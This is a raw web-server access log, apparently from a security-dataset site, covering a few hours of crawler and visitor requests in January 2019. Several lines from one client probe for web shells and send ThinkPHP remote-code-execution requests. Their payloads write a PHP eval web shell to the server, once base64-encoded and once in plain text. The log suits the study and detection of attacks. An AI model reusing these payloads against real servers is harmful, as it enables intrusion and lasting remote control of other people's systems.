54.36.149.47 - - [10/Jan/2019:02:13:25 -0800] "GET /self.logs/2016/access.log.2016-07-14.gz HTTP/1.1" 200 9507 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
18.191.144.104 - - [10/Jan/2019:03:42:30 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
216.244.66.245 - - [10/Jan/2019:03:42:42 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
13.58.1.116 - - [10/Jan/2019:03:45:42 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
177.103.231.6 - - [10/Jan/2019:03:46:48 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0,gzip(gfe)" 
218.98.33.180 - - [10/Jan/2019:03:47:47 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.148.192 - - [10/Jan/2019:03:50:01 -0800] "GET /self.logs/access.log.2016-12-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
199.47.87.141 - - [10/Jan/2019:03:53:44 -0800] "GET /robots.txt HTTP/1.1" 301 446 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Jan/2019:03:53:45 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Jan/2019:03:53:45 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Jan/2019:03:53:45 -0800] "GET / HTTP/1.1" 200 12414 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
185.176.76.220 - - [10/Jan/2019:03:55:54 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
185.176.76.220 - - [10/Jan/2019:03:57:48 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
54.36.149.33 - - [10/Jan/2019:03:58:01 -0800] "GET /self.logs/access.log.2018-12-16.gz HTTP/1.1" 200 23082 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.239 - - [10/Jan/2019:03:59:11 -0800] "GET /self.logs/access.log.2015-03-01.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
185.176.76.220 - - [10/Jan/2019:04:00:20 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 304 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
113.171.224.176 - - [10/Jan/2019:04:01:14 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.89 - - [10/Jan/2019:04:03:04 -0800] "GET /self.logs/2015/error.log.2015-09-24.gz HTTP/1.1" 200 677 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
185.176.76.220 - - [10/Jan/2019:04:04:01 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 304 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
122.170.134.67 - - [10/Jan/2019:04:04:06 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
122.170.134.67 - - [10/Jan/2019:04:04:07 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
162.242.144.71 - - [10/Jan/2019:04:04:54 -0800] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
162.242.144.71 - - [10/Jan/2019:04:04:54 -0800] "GET /robots.txt HTTP/1.1" 304 130 "-" "Tornado-Async-Client" 
162.242.144.71 - - [10/Jan/2019:04:04:55 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
162.242.144.71 - - [10/Jan/2019:04:04:55 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
162.210.196.130 - - [10/Jan/2019:04:06:20 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [10/Jan/2019:04:06:37 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
183.198.58.208 - - [10/Jan/2019:04:07:51 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.149.17 - - [10/Jan/2019:04:08:49 -0800] "GET /self.logs/error.log.2018-12-31.gz HTTP/1.1" 200 5220 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.164 - - [10/Jan/2019:04:09:29 -0800] "GET /self.logs/error.log.2017-09-04.gz HTTP/1.1" 200 615 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [10/Jan/2019:04:09:44 -0800] "GET /self.logs/access.log.2017-08-16.gz HTTP/1.1" 200 21308 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [10/Jan/2019:04:09:46 -0800] "GET /self.logs/access.log.2018-06-22.gz HTTP/1.1" 200 18937 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [10/Jan/2019:04:09:48 -0800] "GET /self.logs/error.log.2017-05-30.gz HTTP/1.1" 200 739 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.65 - - [10/Jan/2019:04:10:24 -0800] "GET /self.logs/2016/error.log.2016-07-29.gz HTTP/1.1" 200 951 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
3.16.138.5 - - [10/Jan/2019:04:12:05 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
203.171.226.142 - - [10/Jan/2019:04:12:29 -0800] "POST /lx.php HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:34 -0800] "POST /cnm.php HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:37 -0800] "POST /shell.php HTTP/1.1" 418 584 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:41 -0800] "POST /tp_exp.php HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:48 -0800] "POST /paylog.php HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:54 -0800] "GET /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=$%7B@print(eval(phpinfo().fputs(fopen('saohai.php','w'),base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='))))%7D HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
203.171.226.142 - - [10/Jan/2019:04:12:57 -0800] "GET /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php','w'),'SaoHai%3C?php%20@eval($_POST['hi']);?%3E'); HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
18.219.132.167 - - [10/Jan/2019:04:15:11 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" 
123.125.71.92 - - [10/Jan/2019:04:17:29 -0800] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 515 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.82 - - [10/Jan/2019:04:17:29 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 697 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.38 - - [10/Jan/2019:04:17:30 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.227 - - [10/Jan/2019:04:17:32 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.158 - - [10/Jan/2019:04:17:34 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
54.36.148.86 - - [10/Jan/2019:04:17:54 -0800] "GET /self.logs/access.log.2017-12-03.gz HTTP/1.1" 200 19242 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.168 - - [10/Jan/2019:04:19:51 -0800] "GET /self.logs/access.log.2017-02-19.gz HTTP/1.1" 200 16385 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
180.97.35.21 - - [10/Jan/2019:04:20:47 -0800] "GET / HTTP/1.1" 301 483 "http://www.baidu.com/s?wd=hardeew" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
180.97.35.91 - - [10/Jan/2019:04:20:48 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
143.225.83.230 - - [10/Jan/2019:04:23:10 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
143.225.83.230 - - [10/Jan/2019:04:23:10 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
143.225.83.230 - - [10/Jan/2019:04:23:11 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
143.225.83.230 - - [10/Jan/2019:04:23:11 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
188.255.16.249 - - [10/Jan/2019:04:23:33 -0800] "GET / HTTP/1.1" 200 12470 "https://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=2029.ge1BuyAEs1AK-Wign0Q8aIkLw-ZiT4rYvJ_A-8Uf9AtKWn1_1K8DgG4wtJ8s-si6.f331da33e33dde606ba91db65fee6455314743f5&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YM1sNxN_KHOPADPyHdOKa1Y&data=UlNrNmk5WktYejR0eWJFYk1LdmtxdFVvX2JPZzkyaEU2WFNsdVNGUmVZbU91UHlqSWwyc08wUHRjWVcxbmJXMW9yTUYwQk04ZlB0Ym8tbVFtWTNtVTJZTmFGRENEaEtVOGF1MlN0RkpiRTA&b64e=2&sign=ca0b5ac94d07a3716bba90301460c9a5&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQaYgAYq7JarrArlXaqTxgT3NdOrrW4KI9w7SJCKKTVdZqI6c5g1FC98LgZJkYCKIOuckmkOgdpC5rvhvZbl_f-O1puz4awhRsMmrsyuyox2mTqDVDDNzFhMDyt4VtR6zMbLhToAKswNq&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCX5No9jVno6gxEjh_QflQAFv7UPRGIIn73QfzZDCtSwvhKLJnFqoVHx1IeajbpAcD1r-apZadFZng&l10n=ru&cts=1547122412512&mc=5.66911060119" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MANM)" 
115.156.215.162 - - [10/Jan/2019:04:24:11 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2767.400" 
54.36.148.252 - - [10/Jan/2019:04:27:07 -0800] "GET /self.logs/2015/access.log.2015-09-13.gz HTTP/1.1" 200 4333 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.28 - - [10/Jan/2019:04:28:17 -0800] "GET /self.logs/2016/error.log.2016-03-10.gz HTTP/1.1" 200 804 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [10/Jan/2019:04:28:58 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.148.203 - - [10/Jan/2019:04:30:39 -0800] "GET /self.logs/error.log.2018-07-05.gz HTTP/1.1" 200 5609 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.138 - - [10/Jan/2019:04:30:53 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.138 - - [10/Jan/2019:04:31:12 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
86.98.155.199 - - [10/Jan/2019:04:32:55 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
86.98.155.199 - - [10/Jan/2019:04:32:55 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
86.98.155.199 - - [10/Jan/2019:04:32:56 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
86.98.155.199 - - [10/Jan/2019:04:32:57 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
79.101.137.182 - - [10/Jan/2019:04:34:19 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.101.137.182 - - [10/Jan/2019:04:34:20 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
18.218.1.84 - - [10/Jan/2019:04:45:35 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
49.196.163.191 - - [10/Jan/2019:04:46:05 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
49.196.163.191 - - [10/Jan/2019:04:46:06 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
49.196.163.191 - - [10/Jan/2019:04:46:06 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
49.196.163.191 - - [10/Jan/2019:04:46:10 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
104.227.89.126 - - [10/Jan/2019:04:46:23 -0800] "GET / HTTP/1.0" 301 446 "http://secrepo.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2; 360SE)" 
104.227.89.126 - - [10/Jan/2019:04:46:23 -0800] "GET / HTTP/1.0" 200 12433 "http://secrepo.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2; 360SE)" 
13.59.67.250 - - [10/Jan/2019:04:46:34 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
54.36.148.236 - - [10/Jan/2019:04:47:27 -0800] "GET /self.logs/access.log.2016-02-15.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.96 - - [10/Jan/2019:04:49:30 -0800] "GET /self.logs/2015/access.log.2015-05-19.gz HTTP/1.1" 200 4725 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.202 - - [10/Jan/2019:04:50:08 -0800] "GET /self.logs/error.log.2017-11-24.gz HTTP/1.1" 200 2215 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.126 - - [10/Jan/2019:04:54:00 -0800] "GET /self.logs/access.log.2016-01-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.98 - - [10/Jan/2019:04:54:05 -0800] "GET /self.logs/2016/error.log.2016-02-10.gz HTTP/1.1" 200 683 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [10/Jan/2019:04:55:41 -0800] "GET /self.logs/error.log.2017-02-06.gz HTTP/1.1" 200 1197 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
113.171.224.176 - - [10/Jan/2019:05:01:58 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.153 - - [10/Jan/2019:05:06:26 -0800] "GET /self.logs/2016/error.log.2016-02-04.gz HTTP/1.1" 200 852 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
18.219.245.160 - - [10/Jan/2019:05:10:30 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" 
54.36.148.152 - - [10/Jan/2019:05:12:12 -0800] "GET /self.logs/2015/access.log.2015-12-12.gz HTTP/1.1" 200 5393 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.90 - - [10/Jan/2019:05:14:20 -0800] "GET /self.logs/access.log.2015-12-07.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.66 - - [10/Jan/2019:05:14:26 -0800] "GET /self.logs/access.log.2015-12-23.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
42.236.99.2 - - [10/Jan/2019:05:15:14 -0800] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
216.244.66.245 - - [10/Jan/2019:05:15:15 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
18.219.132.167 - - [10/Jan/2019:05:15:46 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
54.36.148.191 - - [10/Jan/2019:05:16:21 -0800] "GET /self.logs/access.log.2018-07-18.gz HTTP/1.1" 200 45700 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.96 - - [10/Jan/2019:05:18:49 -0800] "GET /self.logs/2016/access.log.2016-09-19.gz HTTP/1.1" 200 7971 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
183.198.58.208 - - [10/Jan/2019:05:22:21 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
157.55.39.214 - - [10/Jan/2019:05:23:46 -0800] "GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1" 301 539 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
188.121.17.124 - - [10/Jan/2019:05:23:47 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106" 
188.121.17.124 - - [10/Jan/2019:05:23:48 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106" 
188.121.17.124 - - [10/Jan/2019:05:23:48 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106" 
188.121.17.124 - - [10/Jan/2019:05:23:50 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106" 
54.36.149.20 - - [10/Jan/2019:05:25:02 -0800] "GET /self.logs/access.log.2018-09-04.gz HTTP/1.1" 200 35411 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.210 - - [10/Jan/2019:05:26:58 -0800] "GET /self.logs/2016/access.log.2016-06-01.gz HTTP/1.1" 200 9897 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.133 - - [10/Jan/2019:05:28:08 -0800] "GET /self.logs/error.log.2017-12-27.gz HTTP/1.1" 200 1836 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
160.34.126.35 - - [10/Jan/2019:05:28:53 -0800] "GET /self.logs/ HTTP/1.1" 200 14266 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
160.34.126.35 - - [10/Jan/2019:05:28:55 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
160.34.126.35 - - [10/Jan/2019:05:28:55 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
